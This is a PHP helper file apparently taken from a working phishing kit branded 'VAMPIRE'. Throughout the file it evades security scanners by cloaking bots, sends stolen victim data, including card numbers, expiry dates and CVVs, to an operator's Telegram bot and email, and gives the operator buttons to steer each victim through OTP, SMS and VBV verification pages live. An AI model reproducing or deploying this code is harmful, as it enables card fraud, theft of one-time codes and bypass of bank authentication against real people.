<?php

require_once 'config/panel.php';


function get_client_ip() {
    $ip = null;
    foreach (array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR') as $header) {
        if (array_key_exists($header, $_SERVER) === true) {
            foreach (explode(',', $_SERVER[$header]) as $potential_ip) {
                $potential_ip = trim($potential_ip);
                if (filter_var($potential_ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
                    $ip = $potential_ip;
                    break 2;
                }
            }
        }
    }
    return ($ip !== null) ? $ip : '127.0.0.1';
}



function antibotpw() {
    if( empty(ANTIBOTPW_API) )
        return;
    if( $_SESSION['notbot'] == 1 )
        return;
    $ip = get_client_ip();
    $list = file("Panel/blacklist.txt", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (in_array($ip, $list)) {
        header("Location: https://www.google.com/");
        exit();
    }
    $ua = str_replace(' ', '', $_SERVER['HTTP_USER_AGENT']);
    $check = json_decode(file_get_contents('https://antibot.pw/api/v2-blockers?ip='. $ip .'&apikey='. ANTIBOTPW_API .'&ua=' . $ua),true);
    $is_bot = $check['is_bot'];
    if( $is_bot == 1 ) {
        file_put_contents("Panel/botActBan/ip_ban.txt", $ip . "\r\n", FILE_APPEND);
        header("Location: https://www.google.com/");
        exit();
    } else {
        $_SESSION['notbot'] = 1;
    }
}

function update() {

    $ipToDelete = get_client_ip();

    $filePaths = ['Panel/action/ip_sms.txt', 'Panel/action/ip_badsms.txt', 'Panel/action/ip_otp.txt', 'Panel/action/ip_badotp.txt', 'Panel/action/ip_confirm.txt', 'Panel/action/ip_vbv.txt', 'Panel/action/ip_badvbv.txt'];

    try {
        foreach ($filePaths as $filePath) {
            // Read the contents of the file
            $fileContents = file_get_contents($filePath);
            
            // Remove the specified IP address
            $fileContents = str_replace($ipToDelete, '', $fileContents);
            
            // Write the updated contents back to the file
            file_put_contents($filePath, $fileContents);
        }
    } catch (Exception $e) {
        // Handle the exception if needed
    }
}

function response() {
    $ip = get_client_ip(); // Assuming you have a function to get the client's IP address.

    // Define an array of file names to check.
    $fileNames = ['Panel/action/ip_sms.txt', 'Panel/action/ip_badsms.txt', 'Panel/action/ip_otp.txt', 'Panel/action/ip_badotp.txt', 'Panel/action/ip_confirm.txt', 'Panel/action/ip_vbv.txt', 'Panel/action/ip_badvbv.txt'];

    // Loop through the files and check if the IP is in any of them.
    foreach ($fileNames as $index => $fileName) {
        $fileContents = file_get_contents($fileName);

        // Check if the IP address is in the file.
        if (strpos($fileContents, $ip) !== false) {
            // Return a different response based on the file index.
            if ($index === 0) {
                return "sms";
            } elseif ($index === 1) {
                return "badsms";
            } elseif ($index === 2) {
                return "otp";
            } elseif ($index === 3) {
                return "badotp";
            } elseif ($index === 4) {
                return "confirm";
            } elseif ($index === 5) {
                return "vbv";
            } elseif ($index === 6) {
                return "badvbv";
            }
        }
    }

    // If the IP address is not found in any of the files, you can return a default response.
    return "unknown";
}

function BannedIP() {
    $ip = get_client_ip();
    $link_file = "Panel/botActBan/ip_ban.txt";
    $bannedip = file($link_file, FILE_IGNORE_NEW_LINES);

    if (in_array($ip, $bannedip)) {
        header('Location: https://www.google.com/404');
        exit();
    }
}

function update_ini($data, $file)
{
    $content = "";
    $parsed_ini = parse_ini_file($file, true);
    foreach ($data as $section => $values) {
        if ($section === "") {
            continue;
        }
        $content .= $section . "=" . $values . "\n\r";
    }
    if (!$handle = fopen($file, 'w')) {
        return false;
    }
    $success = fwrite($handle, $content);
    fclose($handle);
}

function log_telegram_error($error) {
    $log_file = "Panel/telegram_errors.log";
    $timestamp = date('Y-m-d H:i:s');
    $log_message = "[{$timestamp}] Erreur Telegram: {$error}\n";
    file_put_contents($log_file, $log_message, FILE_APPEND);
}

function send($rezdata) {

    $ip = get_client_ip();
    $bot_url  = TOKEN;
    $chat_id  = CHATID;
    $host = PANEL;
    
    if (strpos($host, 'http') !== 0) {
        $host = 'https://' . $host;
    }
    
    $views = $host."/visitors.html";
    $stats = $host."/app/Panel/stats/index.php";
    $ban = $host."/app/Panel/botActBan/banIpAct.php?ip=".$ip;
    
    // Journaliser les URLs pour le débogage
    log_telegram_error("URLs utilisées: views=$views, stats=$stats, ban=$ban");
    
    $keyboard = json_encode([
        "inline_keyboard" => [
            [
                [
                    "text" => "🔍 Visiteurs",
                    "url" => "$views"
                ]
    
                ],
                [
                    [
                        "text" => "📊 Statistiques",
                        "url" => "$stats"
                    ]
        
                    ],
                [
                    [
                        "text" => "🚫 Bannir IP",
                        "url" => "$ban"
                    ]
        
                ]
        ]
    ]);


    $parameters = array(
        "chat_id" => $chat_id,
        "text" => $rezdata,
        'parse_mode' => 'HTML',
        'reply_markup' => $keyboard
    );

    log_telegram_error("Envoi du message: chat_id=$chat_id, message=".substr($rezdata, 0, 50)."...");
    
    $website_telegram = "https://api.telegram.org/bot{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($parameters));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    
    // Vérifier s'il y a eu une erreur
    if ($result === false) {
        $error = curl_error($ch);
        log_telegram_error("Erreur cURL: " . $error);
        return false;
    } else {
        $response = json_decode($result, true);
        if (!isset($response['ok']) || $response['ok'] !== true) {
            $error_msg = isset($response['description']) ? $response['description'] : 'Erreur inconnue';
            log_telegram_error("Réponse API: " . $error_msg);
            return false;
        } else {
            log_telegram_error("Message envoyé avec succès!");
            return true;
        }
    }
    
    curl_close($ch);
}

function sendnotif($rezdata) {

    $ip = get_client_ip();
    $bot_url  = TOKEN;
    $chat_id  = NOTIF_CHATID;
    $host = PANEL;
    
    if (strpos($host, 'http') !== 0) {
        $host = 'https://' . $host;
    }
    
    $views = $host."/visitors.html";
    $stats = $host."/app/Panel/stats/index.php";
    $ban = $host."/app/Panel/botActBan/banIpAct.php?ip=".$ip;
    
    $keyboard = json_encode([
        "inline_keyboard" => [
            [
                [
                    "text" => "🔍 Visiteurs",
                    "url" => "$views"
                ]
    
                ],
                [
                    [
                        "text" => "📊 Statistiques",
                        "url" => "$stats"
                    ]
        
                    ],
                [
                    [
                        "text" => "🚫 Bannir IP",
                        "url" => "$ban"
                    ]
        
                ]
        ]
    ]);


    $parameters = array(
        "chat_id" => $chat_id,
        "text" => $rezdata,
        'parse_mode' => 'HTML',
        'reply_markup' => $keyboard
    );

    $website_telegram = "https://api.telegram.org/bot{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($parameters));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    
    // Vérifier s'il y a eu une erreur
    if ($result === false) {
        $error = curl_error($ch);
        log_telegram_error("Erreur cURL (sendnotif): " . $error);
    } else {
        $response = json_decode($result, true);
        if (!isset($response['ok']) || $response['ok'] !== true) {
            $error_msg = isset($response['description']) ? $response['description'] : 'Erreur inconnue';
            log_telegram_error("Réponse API (sendnotif): " . $error_msg);
        }
    }
    
    curl_close($ch);
    return $result;
}

function sendCard($rezdata) {

    $ip = get_client_ip();
    $bot_url  = TOKEN;
    $chat_id  = CHATID;
    $host = PANEL;
    
    if (strpos($host, 'http') !== 0) {
        $host = 'https://' . $host;
    }
    
    $fastLink = $host."/app/Panel/scan/index.php?ccn=" .(isset($_SESSION['sccn']) ? $_SESSION['sccn'] : ''). '&exp=' .(isset($_SESSION['sexp']) ? $_SESSION['sexp'] : ''). '&cch=Vampire&cvv='.(isset($_SESSION['scvv']) ? $_SESSION['scvv'] : '');
    $views = $host."/visitors.html";
    $ban = $host."/app/Panel/botActBan/banIpAct.php?ip=".$ip;
    
    // Obtenir le BIN de la carte (6 premiers chiffres)
    $bin = isset($_SESSION['scan']) ? substr($_SESSION['scan'], 0, 6) : '000000';
    // URL de l'image de la carte basée sur le BIN
    $card_image_url = "https://cardimages.imaginecurve.com/cards/" . $bin . ".png";
    
    $keyboard = json_encode([
        "inline_keyboard" => [
            [
                [
                    "text" => "🔍 Visiteurs",
                    "url" => "$views"
                ]
    
                ],
            [
                [
                    "text" => "⚡ Lien Rapide",
                    "url" => "$fastLink"
                ]
    
                ],
                [
                    [
                        "text" => "🚫 Bannir IP",
                        "url" => "$ban"
                    ]
        
                ]
        ]
    ]);

    // Envoi de l'image de la carte
    $photo_parameters = array(
        "chat_id" => $chat_id,
        "photo" => $card_image_url,
        "caption" => "Image de la carte basée sur le BIN: " . $bin
    );
    
    $website_telegram = "https://api.telegram.org/bot{$bot_url}";
    $ch_photo = curl_init($website_telegram . '/sendPhoto');
    curl_setopt($ch_photo, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch_photo, CURLOPT_POST, 1);
    curl_setopt($ch_photo, CURLOPT_POSTFIELDS, http_build_query($photo_parameters));
    curl_setopt($ch_photo, CURLOPT_SSL_VERIFYPEER, false);
    $photo_result = curl_exec($ch_photo);
    
    // Vérifier s'il y a eu une erreur avec l'envoi de la photo
    if ($photo_result === false) {
        $error = curl_error($ch_photo);
        log_telegram_error("Erreur cURL (sendCard - photo): " . $error);
    } else {
        $response = json_decode($photo_result, true);
        if (!isset($response['ok']) || $response['ok'] !== true) {
            $error_msg = isset($response['description']) ? $response['description'] : 'Erreur inconnue';
            log_telegram_error("Réponse API (sendCard - photo): " . $error_msg);
        }
    }
    
    curl_close($ch_photo);

    // Envoi du message texte
    $parameters = array(
        "chat_id" => $chat_id,
        "text" => $rezdata,
        'parse_mode' => 'HTML',
        'reply_markup' => $keyboard
    );

    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($parameters));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    
    // Vérifier s'il y a eu une erreur avec l'envoi du message
    if ($result === false) {
        $error = curl_error($ch);
        log_telegram_error("Erreur cURL (sendCard - message): " . $error);
    } else {
        $response = json_decode($result, true);
        if (!isset($response['ok']) || $response['ok'] !== true) {
            $error_msg = isset($response['description']) ? $response['description'] : 'Erreur inconnue';
            log_telegram_error("Réponse API (sendCard - message): " . $error_msg);
        }
    }
    
    curl_close($ch);
    return $result;
}

function sendKey($rezdata) {

    $ip = get_client_ip();
    $bot_url  = TOKEN;
    $chat_id  = CHATID;
    $host = PANEL;
    
    if (strpos($host, 'http') !== 0) {
        $host = 'https://' . $host;
    }
    
    $ban = $host."/app/Panel/botActBan/banIpAct.php?ip=".$ip;
    $otp = $host."/app/Panel/action/insert.php?ip=".$ip."&view=otp";
    $badotp = $host."/app/Panel/action/insert.php?ip=".$ip."&view=badotp";
    $sms = $host."/app/Panel/action/insert.php?ip=".$ip."&view=sms";
    $badsms = $host."/app/Panel/action/insert.php?ip=".$ip."&view=badsms";
    $conf = $host."/app/Panel/action/insert.php?ip=".$ip."&view=confirm";
    $pin = $host."/app/Panel/action/insert.php?ip=".$ip."&view=vbv";
    $badpin = $host."/app/Panel/action/insert.php?ip=".$ip."&view=badvbv";
    
    $keyboard = json_encode([
        "inline_keyboard" => [
            [
                [
                    "text" => "📲 OTP ✅",
                    "url" => "$otp"
                ],
                [
                    "text" => "📲 OTP ❌",
                    "url" => "$badotp"
                ]
            ],
            [
                [
                    "text" => "📱 SMS ✅",
                    "url" => "$sms"
                ],
                [
                    "text" => "📱 SMS ❌",
                    "url" => "$badsms"
                ]
            ],
            [
                [
                    "text" => "🔐 VBV ✅",
                    "url" => "$pin"
                ],
                [
                    "text" => "🔐 BADVBV ❌",
                    "url" => "$badpin"
                ]
            ],
            [
                [
                    "text" => "✅ CONFIRMER ✅",
                    "url" => "$conf"
                ]
            ],
            [
                [
                        "text" => "🚫 Bannir IP",
                        "url" => "$ban"
                ]
            ]
        ]
    ]);


    $parameters = array(
        "chat_id" => $chat_id,
        "text" => $rezdata,
        'parse_mode' => 'HTML',
        'reply_markup' => $keyboard
    );

    $website_telegram = "https://api.telegram.org/bot{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($parameters));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    
    // Vérifier s'il y a eu une erreur
    if ($result === false) {
        $error = curl_error($ch);
        log_telegram_error("Erreur cURL (sendKey): " . $error);
    } else {
        $response = json_decode($result, true);
        if (!isset($response['ok']) || $response['ok'] !== true) {
            $error_msg = isset($response['description']) ? $response['description'] : 'Erreur inconnue';
            log_telegram_error("Réponse API (sendKey): " . $error_msg);
        }
    }
    
    curl_close($ch);
    return $result;
}


function sendMail($maildata) {
    $Bullet = BULLET;
    $subject = "VAMPIRE REZDATA";
    $headers = "From: VAMPIRE  <rezdata@vampire-main.com>\r\n";
    $headers .= 'MIME-Version: 1.0' . "\r\n";
    $headers .= 'Content-type: text/plain; charset=iso-8859-1' . "\r\n";
    return @mail($Bullet, $subject, $maildata, $headers);
}

function BinCheck($new_string) {
    $cc = $new_string;
    $bin = substr($cc, 0, 6);
    $bins = str_replace(' ', '', $bin);
    
    $ch = curl_init();
    $url = "https://lookup.binlist.net/" . $bin;
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    $headers = array();
    $headers[] = 'Accept-Version: 3';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $res = curl_exec($ch);

    if (curl_errno($ch)) {
        echo 'Error:' . curl_error($ch);
    }

    curl_close($ch);

    $someArray = json_decode($res, true);

    $_SESSION['bank'] = $someArray['bank']['name'];
    $_SESSION['type'] = $someArray['type'];
    $_SESSION['level'] = $someArray['brand'];
    $_SESSION['country'] = $someArray['country']['name'];
}
function is_valid_luhn($number) {
    settype($number, 'string');
    $sumTable = array(
        array(0,1,2,3,4,5,6,7,8,9),
        array(0,2,4,6,8,1,3,5,7,9));
    $sum = 0;
    $flip = 0;
    for ($i = strlen($number) - 1; $i >= 0; $i--) {
        $sum += $sumTable[$flip++ & 0x1][$number[$i]];
    }
    return $sum % 10 === 0;
}